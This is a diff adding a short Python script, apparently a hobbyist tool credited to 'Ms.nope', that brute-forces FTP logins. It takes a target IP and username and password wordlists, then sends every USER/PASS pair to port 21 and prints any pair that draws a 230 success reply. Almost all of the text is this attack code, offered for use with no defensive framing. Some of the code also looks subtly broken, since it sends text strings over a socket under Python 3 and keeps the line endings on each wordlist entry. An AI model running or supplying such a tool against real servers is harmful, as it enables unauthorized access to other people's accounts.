@@ -1,0 +1,39 @@
+#!/usr/bin/python3
+# This code write by (Ms.nope)
+from socket import *
+import re
+import os
+import time
+class color:
+      green = '\033[91m'
+      red = '\033[92m'
+      End = '\033[0m'
+      blue = '\033[96m'
+os.system("clear")
+print(color.green + """
+__________                __                  ___________                         
+\______   \_______ __ ___/  |_  ____          \_   _____/__________   ____  ____  
+ |    |  _/\_  __ \  |  \   __\/ __ \   ______ |    __)/  _ \_  __ \_/ ___\/ __ \ 
+ |    |   \ |  | \/  |  /|  | \  ___/  /_____/ |     \(  <_> )  | \/\  \__\  ___/ 
+ |______  / |__|  |____/ |__|  \___  >         \___  / \____/|__|    \___  >___  >
+        \/                         \/              \/                    \/    \/  """   + color.End + color.red + """
+     [This code write by """ + color.blue + "Ms.nope" + color.red + " ]" + color.End + color.red + """ [https://github.com/msprogrammer2938] """ + color.End)
+ip = input("\nEnter ip: ")
+user = input("Enter userlist: ")
+passwd = input("Enter passlist: ")
+userlist = open(user,"r")
+for users in userlist.readlines():
+	passlist = open(passwd,"r")
+	for passwords in passlist.readlines():
+		s = socket(AF_INET,SOCK_STREAM)
+		s.connect_ex((ip,21))
+		s.recv(1024)
+		s.send('USER %s\r\n'%(users))
+		res = s.recv(1024)
+		s.send('PASS %s\r\n'%(passwords))
+		res = s.recv(1024)
+		if re.search('230',res):
+		   print(color.green + "Password Find: " + color.End + passwords)
+		else:
+	            print(color.red + "searching: " + color.End + ip)
+	            print("-------------------------------------------------")
